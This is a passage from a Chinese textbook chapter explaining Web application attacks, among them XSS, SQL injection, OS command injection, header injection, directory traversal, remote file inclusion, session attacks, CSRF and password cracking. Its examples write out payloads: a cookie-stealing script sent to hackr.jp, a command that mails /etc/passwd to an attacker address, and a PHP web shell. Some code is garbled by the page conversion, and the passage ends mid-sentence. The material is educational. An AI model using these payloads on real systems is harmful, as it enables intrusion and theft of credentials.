应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期数据不相同的内容。在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。图：对 Web 应用的攻击11.1.3　针对 Web 应用的攻击模式对 Web 应用的攻击模式有以下两种。主动攻击被动攻击以服务器为目标的主动攻击主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。199主动攻击模式里具有代表性的攻击是 SQL 注入攻击和 OS 命令注入攻击。图：主动攻击以服务器为目标的被动攻击被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。被动攻击通常的攻击模式如下所示。步骤 1： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。步骤 2： 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。步骤 3： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。步骤 4： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。200图：被动攻击利用用户的身份攻击企业内部网络利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击。很多企业内网依然可以连接到互联网上，访问 Web 网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击。201图：利用被动攻击对企业内网发动攻击11.2　因输出值转义不完全引发的安全漏洞实施 Web 应用的安全对策可大致分为以下两部分。客户端的验证Web 应用端（服务器端）的验证输入值验证输出值转义图：验证数据的几个地方202多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI体验的作用。Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。11.2.1　跨站脚本攻击跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。跨站脚本攻击有可能造成以下影响。利用虚假输入表单骗取用户个人信息。利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。显示伪造的文章或图片。跨站脚本攻击案例在动态生成 HTML 处发生下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。203图：解跨站脚本攻击案例确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口一郎这样的 HTML 标签的字符串。图：按照输入内容原样显示的机制此时的确认界面上，浏览器会把用户输入的 <s> 解析成 HTML标签，然后显示删除线。删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。XSS 是攻击者利用预先设置的陷阱触发的被动攻击跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。204充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页面内，诱使用户去点击该 URL。<a href="http://example.jp/login?ID=&quot;&gt;" target="_blank" rel="noopener">http://example.jp/login?ID=&quot;&gt;</a><script>var+f=document.getElementById(“login”);+f.act浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。对 <a href="http://example.jp/login?ID=yama">http://example.jp/login?ID=yama</a> 请求时对应的 HTML源代码（摘录）<div class="logo"><img src="/img/logo.gif" alt="E! 拍卖会" /></div><form action="http://example.jp/login" method="post" id="login"><div class="input_id">205 ID <input type="text" name="ID" value="yama" /></div><a href="http://example.jp/login?ID=&quot;&gt;">http://example.jp/login?ID=&quot;&gt;</a><script>var+f=document.getElementById(“login”);+f.action=”</script>&lt;span+s=” 对请求时对应的HTML源代码（摘录）<div class="logo">&lt;img src=”/img/logo.gif” alt=”E! 拍卖会 /&gt;</div><form action="http://example.jp/login" method="post" id="login"><div class="input_id">ID <input type="text" name="ID" value=""><script>var f=document.getElementById(“</div>对用户 Cookie 的窃取攻击除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。&lt;script src=<a href="http://hackr.jp/xss.js&gt;">http://hackr.jp/xss.js&gt;</a></script>该脚本内指定的 <a href="http://hackr.jp/xss.js" target="_blank" rel="noopener">http://hackr.jp/xss.js</a> 文件。即下面这段采用JavaScript 编写的代码。var content = escape(document.cookie);document.write(“&lt;img src=<a href="http://hackr.jp/?&quot;);document.write(content);document.write(&quot;&gt;&quot;);在存在可跨站脚本攻击安全漏洞的" target="_blank" rel="noopener">http://hackr.jp/?&quot;);document.write(content);document.write(&quot;&gt;&quot;);在存在可跨站脚本攻击安全漏洞的</a> Web 应用上执行上面这段JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然 后这些信息会发送至攻击者的 Web 网站（<a href="http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的" target="_blank" rel="noopener">http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的</a> Cookie 信息了。206图：使用 XSS 攻击夺取 Cookie 信息11.2.2　SQL 注入攻击会执行非法 SQL 的 SQL 注入攻击SQL 注入（SQL Injection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL 而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。Web 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用 SQL 语句连接数据库进行特定的操作。如果在调用 SQL 语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法 SQL 语句。SQL 注入攻击有可能会造成以下等影响。非法查看或篡改数据库内的数据规避认证执行和数据库服务器业务关联的程序等何为 SQLSQL 是用来操作关系型数据库管理系统（Relational DataBaseManagement System，RDBMS）的数据库语言，可进行操作数据或定义数据等。RDBMS 中有名的数据库有 Oracle Database、Microsoft SQL Server、IBM DB2、MySQL 和 PostgreSQL 等。这些数据库系统都可以把 SQL 作为数据库语言使用。使用数据库的 Web 应用，通过某种方法将 SQL 语句传给207RDBMS，再把 RDBMS 返回的结果灵活地使用在 Web 应用中。SQL 语句示例SELECT title,text FROM newsTbl WHERE id=123SQL 注入攻击案例下面以某个购物网站的搜索功能为例，讲解 SQL 注入攻击。通过该功能，我们可以将某作者的名字作为搜索关键字，查找该作者的所有著作。图：SQL 注入攻击案例正常处理的操作示例下图是将“上野宣”作为关键字的搜索结果。208图：正常处理操作的示例URL 的查询字段已指定 q= 上野宣，这个值由 Web 应用传入到SQL 语句中，构成下方的 SQL 语句。SELECT <em> FROM bookTbl WHERE author = ‘上野宣’ and flag = 1;该 SQL 语句表示“从 bookTbl 表中，显示满足 author= 上野宣 andflag=1（可售）所在行的数据”。数据库内的 bookTbl 表记录着该购物网站的所有书籍信息。通过SQL 语句，将满足作者名（author）上野宣并且 flag 为 1 双重条件的条目取出，最后作为搜索结果显示出来。209图：数据库处理SQL 注入攻击的操作示例把刚才指定查询字段的上野宣改写成“上野宣’–”。图：SQL 注入攻击的操作示例构成的 SQL 语句就变成“从数据库的 bookTbl 表中，显示满足author= 上野宣条件所在行的数据”，如下所示。SELECT </em> FROM bookTbl WHERE author =’上野宣’ - -‘ and flag=1;SQL 语句中的 – 之后全视为注释。即，and flag=1 这个条件被自动忽略了。210图：数据库处理结果跟 flag 的设定值无关，只取出满足 author=“上野宣”条件所在行的数据，这样连那些尚未出版的书籍也一并显示出来了。图：被 SQL 注入的后果SQL 注入攻击破坏 SQL 语句结构的案例SQL 注入是攻击者将 SQL 语句改变成开发者意想不到的形式以达到破坏结构的攻击。比如，在之前的攻击案例中，就会把 author 的字面值（程序中使用 的常量）” 上野宣 ‘–” 的字符串赋值给 $q。211图：SQL 注入攻击的原理上图中颜色标记的字符串最开始的单引号 (‘) 表示会将 author 的字面值括起来，以到达第二个单引号后作为结束。因此，author的字面值就成了上野宣，而后面的 – 则不再属于 author 字面值，会被解析成其他的句法。本案例中的问题仅仅是把未出版书籍的条目也一同显示出来了。但实际发生 SQL 注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览及篡改，从而使用户遭受不同程度的损失。11.2.3　OS 命令注入攻击OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell时存在疏漏，就可以执行插入的非法 OS 命令。OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。OS 注入攻击案例下面以咨询表单的发送功能为例，讲解 OS 注入攻击。该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。212图：OS 注入攻击的攻击案例下面摘选处理该表单内容的一部分核心代码。my $adr = $q-&gt;param(‘mailaddress’);open(MAIL, “| /usr/sbin/sendmail $adr”);print MAIL “From: <a href="mailto:info@example.com" target="_blank" rel="noopener">info@example.com</a>\n”;程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。攻击者将下面的值指定作为邮件地址。; cat /etc/passwd | mail <a href="mailto:hack@example.jp" target="_blank" rel="noopener">hack@example.jp</a>程序接收该值，构成以下的命令组合。| /usr/sbin/sendmail ; cat /etc/passwd | mail <a href="mailto:hack@example.jp" target="_blank" rel="noopener">hack@example.jp</a>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail <a href="mailto:hack@example.jp" target="_blank" rel="noopener">hack@example.jp</a> 这样的命令了。结果，含有Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了<a href="mailto:hack@example.jp" target="_blank" rel="noopener">hack@example.jp</a>。11.2.4　HTTP 首部注入攻击HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被213动攻击模式。向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTPResponse Splitting Attack）。如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。Location: <a href="http://www.example.com/a.cgi?q=12345Set-Cookie" target="_blank" rel="noopener">http://www.example.com/a.cgi?q=12345Set-Cookie</a>: UID=12345＊12345就是插入值HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。HTTP 首部注入攻击有可能会造成以下一些影响。设置任何 Cookie 信息重定向至任意 URL显示任意的主体（HTTP 响应截断攻击）HTTP 首部注入攻击案例下面我们以选定某个类别后即可跳转至各类别对应页面的功能为例，讲解 HTTP 首部注入攻击。该功能为每个类别都设定了一个类别 ID 值，一旦选定某类别，就会将该 ID 值反映在响应内的Location 首部字段内，形如 Location: <a href="http://example.com/?cat=101。令浏览器发生重定" target="_blank" rel="noopener">http://example.com/?cat=101。令浏览器发生重定</a> 向跳转。214图：HTTP 首部注入攻击示例攻击者以下面的内容替代之前的类别 ID 后发送请求。101%0D%0ASet-Cookie:+SID=123456789其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（<a href="http://hackr.jp/）的会话" target="_blank" rel="noopener">http://hackr.jp/）的会话</a> ID 设置成SID=123456789 的 Set-Cookie 首部字段。发送该请求之后，假设结果返回以下响应。Location: <a href="http://example.com/?cat=101（%0D%0A" target="_blank" rel="noopener">http://example.com/?cat=101（%0D%0A</a> ：换行符）Set-Cookie: SID=123456789此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。攻击者输入的 %0D%0A，原本应该属于首部字段 Location 的查询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入了新的首部字段。这样一来，攻击者可在响应中插入任意的首部字段。HTTP 响应截断攻击215HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。%0D%0A%0D%0A<html><head><meta name="generator" content="Hexo 3.8.0"><title>之后，想要显示的网页内容 &lt;!–在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。Set-Cookie: UID=（%0D%0A ：换行符）（%0D%0A ：换行符）<html><head><meta name="generator" content="Hexo 3.8.0"><title>之后，想要显示的网页内容 &lt;!–（原来页面对应的首部字利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。另外，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的 Web 网页。11.2.5　邮件首部注入攻击邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。邮件首部注入攻击案例下面以 Web 页面中的咨询表单为例讲解邮件首部注入攻击。该功能可在表单内填入咨询者的邮件地址及咨询内容后，以邮件的形式发送给网站管理员。216图：邮件首部注入攻击案例攻击者将以下数据作为邮件地址发起请求。<a href="mailto:bob@hackr.jp" target="_blank" rel="noopener">bob@hackr.jp</a>%0D%0ABcc: <a href="mailto:user@example.com" target="_blank" rel="noopener">user@example.com</a>%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送。<a href="mailto:bob@hackr.jp" target="_blank" rel="noopener">bob@hackr.jp</a>%0D%0A%0D%0ATest Message再以相同的方法，就有可能改写 To 和 Subject 等任意邮件首部，或向文本添加附件等动作。11.2.6　目录遍历攻击目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用 …/ 等相对路径定位到 /etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。217目录遍历攻击案例下面以显示读取文件功能为例，讲解目录遍历攻击。该功能通过以下查询字段，指定某个文件名。然后从 /www/log/ 文件目录下读取这个指定的文件。<a href="http://example.com/read.php?log=0401.log攻击者设置如下查询字段后发出请求。http://example.com/read.php?log=../../etc/passwd查询字段为了读取攻击者盯上的" target="_blank" rel="noopener">http://example.com/read.php?log=0401.log攻击者设置如下查询字段后发出请求。http://example.com/read.php?log=../../etc/passwd查询字段为了读取攻击者盯上的</a> /etc/passwd 文件，会从/www/log/ 目录开始定位相对路径。如果这份 read.php 脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。图：目录遍历攻击案例11.2.7　远程文件包含漏洞远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。这主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说，这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。但是，该功能太危险，PHP5.2.0 之后默认设定此功能无效。固然存在输出值转义的问题，但更应控制对任意文件名的指定。218远程文件包含漏洞的攻击案例下面以 include 读入由查询字段指定文件的功能为例，讲解远程文件包含漏洞。该功能可通过以下查询字段形式指定文件名，并在脚本内的 include 语句处读入这个指定文件。<a href="http://example.com/foo.php?mod=news.php对应脚本的源代码如下所示。http://example.com/foo.php" target="_blank" rel="noopener">http://example.com/foo.php?mod=news.php对应脚本的源代码如下所示。http://example.com/foo.php</a> 的源代码（部分摘录）$modname = $_GET[‘mod’];include($modname);攻击者指定如同下面形式的 URL 发出请求。<a href="http://example.com/foo.php?mod=http://hackr.jp/cmd.php&amp;cmd=ls攻击者已事先在外部服务器上准备了以下这段脚本。http://hackr.jp/cmd.php" target="_blank" rel="noopener">http://example.com/foo.php?mod=http://hackr.jp/cmd.php&amp;cmd=ls攻击者已事先在外部服务器上准备了以下这段脚本。http://hackr.jp/cmd.php</a> 的源代码&lt;? system($_GET[‘cmd’]) ?&gt;假设 Web 服务器（example.com）的 include 可以引入外部服务器的 URL，那就会读入攻击者在外部服务器上事先准备的URL（<a href="http://hackr.jp/cmd.php）。结果，通过" target="_blank" rel="noopener">http://hackr.jp/cmd.php）。结果，通过</a> system 函数就能在Web 服务器（example.com）上执行查询字段指定的 OS 命令了。219图：远程文件包含漏洞的攻击案例在以上攻击案例中，执行了可显示 Web 服务器（example.com）上文件及目录信息的 ls 命令。11.3　因设置或设计上的缺陷引发的安全漏洞因设置或设计上的缺陷引发的安全漏洞是指，错误设置 Web 服务器，或是由设计上的一些问题引起的安全漏洞。11.3.1　强制浏览强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。强制浏览有可能会造成以下一些影响。泄露顾客的个人信息等重要情报泄露原本需要具有访问权限的用户才可查阅的信息内容泄露未外连到外界的文件对那些原本不愿公开的文件，为了保证安全会隐蔽其 URL。可一旦知道了那些 URL，也就意味着可浏览 URL 对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使 URL 产生220泄露。文件目录一览<a href="http://www.example.com/log/通过指定文件目录名称，即可在文件一览中看到显示的文件名。容易被推测的文件名及目录名http://www.example.com/entry/entry_081202.log文件名称容易推测（按上面的情况，可推出下一个文件是entry_081203.log）备份文件http://www.example.com/cgi-bin/entry.cgi（原始文件）http://www.example.com/cgi-bin/entry.cgi~（备份文件）http://www.example.com/cgi-bin/entry.bak（备份文件）由编辑软件自动生成的备份文件无执行权限，有可能直接以源代码形式显示经认证才可显示的文件直接通过" target="_blank" rel="noopener">http://www.example.com/log/通过指定文件目录名称，即可在文件一览中看到显示的文件名。容易被推测的文件名及目录名http://www.example.com/entry/entry_081202.log文件名称容易推测（按上面的情况，可推出下一个文件是entry_081203.log）备份文件http://www.example.com/cgi-bin/entry.cgi（原始文件）http://www.example.com/cgi-bin/entry.cgi~（备份文件）http://www.example.com/cgi-bin/entry.bak（备份文件）由编辑软件自动生成的备份文件无执行权限，有可能直接以源代码形式显示经认证才可显示的文件直接通过</a> URL 访问原本必须经过认证才能在 Web 页面上使用的文件（HTML 文件、图片、PDF 等文档、CSS 以及其他数据等）强制浏览导致安全漏洞的案例下面我们以会员制度的 SNS 日记功能为例，讲解强制浏览可能导致的安全漏洞。该日记功能保证了除具有访问权限的用户本人以外，其他人都不能访问日记。221图：强制浏览导致安全漏洞的案例该日记中包含的图像照片的源代码如下所示。<img src="http://example.com/img/tRNqSUBdG7Da.jpg">即使没有对这篇日记的访问权限，只要知道这图片的 URL，通过直接指定 URL 的方式就能显示该图片。日记的功能和文本具有访问对象的控制，但不具备对图片访问对象的控制，从而产生了安全漏洞。11.3.2　不正确的错误消息处理不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。与 Web 应用有关的主要错误信息如下所示。Web 应用抛出的错误消息数据库等系统抛出的错误消息Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。不正确的错误消息处理导致安全漏洞的案例Web 应用抛出的错误消息下面以认证功能的认证错误消息为例，讲解不正确的错误消息处理方式。该认证功能，在输入表单内的邮件地址及密码匹配发生222错误时，会提示错误信息。图：不正确的错误消息处理导致安全漏洞的案例上方画面提示“邮件地址未注册”的错误消息。当输入的邮件地址尚未在该 Web 网站上注册时，就会触发这条错误消息。因为倘若邮件地址存在，应该会提示“输入的密码有误”之类的错误消息。攻击者利用进行不同的输入会提示不同的错误信息这条，就可用来确认输入的邮件地址是否已在这个 Web 网站上注册过了。为了不让错误消息给攻击者以启发，建议将提示消息的内容仅保留到“认证错误”这种程度即可。数据库等系统抛出的错误消息下面我们以搜索功能提示的错误信息为例，讲解不正确的错误消息处理。本功能用于检索数据，当输入未预料的字符串时，会提示数据库的错误。下面以认证功能的认证错误消息为例，讲解不正确的错误消息处理。该认证功能在输入表单内的邮件地址及密码匹配发生错误时，会提示错误信息。223图：不正确的错误消息处理导致安全漏洞的案例上方的画面中显示了与 SQL 有关的错误信息。对开发者而言，该信息或许在 Debug 时会有帮助，但对用户毫无用处。攻击者从这条消息中可读出数据库选用的是 MySQL，甚至还看见了 SQL 语句的片段。这可能给攻击者进行 SQL 注入攻击以启发。系统抛出的错误主要集中在以下几个方面。PHP 或 ASP 等脚本错误数据库或中间件的错误Web 服务器的错误各系统应对详细的错误消息进行抑制设定，或使用自定义错误消息，以避免某些错误信息给攻击者以启发。11.3.3　开放重定向开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。开放重定向的攻击案例224我们以下面的 URL 做重定向为例，讲解开放重定向攻击案例。该功能就是向 URL 指定参数后，使本来的 URL 发生重定向跳转。<a href="http://example.com/?redirect=http://www.tricorder.jp攻击者把重定向指定的参数改写成已设好陷阱的" target="_blank" rel="noopener">http://example.com/?redirect=http://www.tricorder.jp攻击者把重定向指定的参数改写成已设好陷阱的</a> Web 网站对应的 连接，如下所示。<a href="http://example.com/?redirect=http://hackr.jp用户看到" target="_blank" rel="noopener">http://example.com/?redirect=http://hackr.jp用户看到</a> URL 后原以为访问 example.com，不料实际上被诱导至hackr.jp 这个指定的重定向目标。可信度高的 Web 网站如果开放重定向功能，则很有可能被攻击者选中并用来作为钓鱼攻击的跳板。11.4　因会话管理疏忽引发的安全漏洞会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。11.4.1　会话劫持会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。225图：会话劫持具备认证功能的 Web 应用，使用会话 ID 的会话管理机制，作为管理认证状态的主流方式。会话 ID 中记录客户端的 Cookie 等信息，服务器端将会话 ID 与认证状态进行一对一匹配管理。下面列举了几种攻击者可获得会话 ID 的途径。通过非正规的生成方法推测会话 ID通过窃听或 XSS 攻击盗取会话 ID通过会话固定攻击（Session Fixation）强行获取会话 ID会话劫持攻击案例下面我们以认证功能为例讲解会话劫持。这里的认证功能通过会话管理机制，会将成功认证的用户的会话 ID（SID）保存在用户浏览器的 Cookie 中。226图：会话劫持攻击案例攻击者在得知该 Web 网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用 JavaScript 脚本调用 document.cookie 以窃取Cookie 信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击者就能获取含有会话 ID 的 Cookie。攻击者拿到用户的会话 ID 后，往自己的浏览器的 Cookie 中设置该会话 ID，即可伪装成会话 ID 遭窃的用户，访问 Web 网站了。11.4.2　会话固定攻击对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。会话固定攻击案例下面我们以认证功能为例讲解会话固定攻击。这个 Web 网站的认证功能，会在认证前发布一个会话 ID，若认证成功，就会在服务器内改变认证状态。227图：会话固定攻击案例攻击者准备陷阱，先访问 Web 网站拿到会话ID（SID=f5d1278e8109）。此刻，会话 ID 在服务器上的记录仍是（未认证）状态。（步骤① ~ ②）攻击者设置好强制用户使用该会话 ID 的陷阱，并等待用户拿着这个会话 ID 前去认证。一旦用户触发陷阱并完成认证，会话ID（SID=f5d1278e8109）在服务器上的状态（用户 A 已认证）就会被记录下来。（步骤③）攻击者估计用户差不多已触发陷阱后，再利用之前这个会话 ID访问网站。由于该会话 ID 目前已是（用户 A 已认证）状态，于是攻击者作为用户 A 的身份顺利登录网站。（步骤④）Session AdoptionSession Adoption 是指 PHP 或 ASP.NET 能够接收处理未知会话 ID的功能。恶意使用该功能便可跳过会话固定攻击的准备阶段，从 Web 网站 获得发行的会话 ID 的步骤。即，攻击者可私自创建会话 ID构成陷阱，中间件却会误以为该会话 ID 是未知会话 ID 而接受。11.4.3　跨站点请求伪造228跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。跨站点请求伪造有可能会造成以下等影响。利用已通过认证的用户权限更新设定信息等利用已通过认证的用户权限购买商品利用已通过认证的用户权限在留言板上发表言论跨站点请求伪造的攻击案例下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。图：跨站点请求伪造的攻击案例在该留言板系统上，受害者用户 A 是已认证状态。它的浏览器中的 Cookie 持有已认证的会话 ID（步骤①）。229攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户 A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤②）。触发陷阱之际，如果用户 A 尚未通过认证，则无法利用用户 A的身份权限在留言板上发表内容。11.5　其他安全漏洞11.5.1　密码破解密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等），本节将会讲解对具备认证功能的 Web 应用进行的密码破解。密码破解有以下两种手段。通过网络的密码试错对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）除去突破认证的攻击手段，还有 SQL 注入攻击逃避认证，跨站脚本攻击窃取密码信息等方法。通过网络进行密码试错对 Web 应用提供的认证功能，通过网络尝试候选密码进行的一种攻击。主要有以下两种方式。穷举法字典攻击穷举法穷举法（Brute-force Attack，又称暴力破解法）是指对所有密钥集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击。230比如银行采用的个人识别码是由“4 位数字”组成的密码，那么就要从 0000~9999 中的全部数字逐个进行尝试。这样一来，必定在候选的密码集合中存在一个正确的密码，可通过认证。因为穷举法会尝试所有的候选密码，所以是一种必然能够破解密码的攻击。但是，当密钥空间很庞大时，解密可能需要花费数年，甚至千年的时间，因此从现实角度考量，攻击是失败的。字典攻击字典攻击是指利用事先收集好的候选密码（经过各种组合方式后存入字典），枚举字典中的密码，尝试通过认证的一种攻击手法。还是举银行采用个人识别码是“4 位数字”的密码的例子，考虑到用户使用自己的生日做密码的可能性较高，于是就可以把生日日期数值化，如将 0101~1231 保存成字典，进行尝试。与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费的时间比较短。但是，如果字典中没有正确的密码，那就无法破解成功。因此攻击的成败取决于字典的内容。图：穷举法和字典攻击231利用别处泄露的 ID·密码进行攻击字典攻击中有一种利用其他 Web 网站已泄露的 ID 及密码列表进行的攻击。很多用户习惯随意地在多个 Web 网站使用同一套 ID 及密码，因此攻击会有相当高的成功几率 1 。1 根据警方的调查统计，成功入侵率有 6.7%。平成 23 年（2011 年）公布的非法访问行为的具体发生状况请参见<a href="http://www.npa.go.jp/cyber/statics/h23/pdf040.pdf对已加密密码的破解Web" target="_blank" rel="noopener">http://www.npa.go.jp/cyber/statics/h23/pdf040.pdf对已加密密码的破解Web</a> 应用在保存密码时，一般不会直接以明文的方式保存，通过散列函数做散列处理或加 salt 的手段对要保存的密码本身加密。那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这些密码，则必须先通过解码等手段，把加密处理的密码还原成明文形式。图：破解已加密的密码从加密过的数据中导出明文通常有以下几种方法。通过穷举法·字典攻击进行类推彩虹表拿到密钥232加密算法的漏洞通过穷举法·字典攻击进行类推针对密码使用散列函数进行加密处理的情况，采用和穷举法或字典攻击相同的手法，尝试调用相同的散列函数加密候选密码，然后把计算出的散列值与目标散列值匹配，类推出密码。图：破解已加密的密码 / 通过穷举法·字典攻击进行类推彩虹表彩虹表（Rainbow 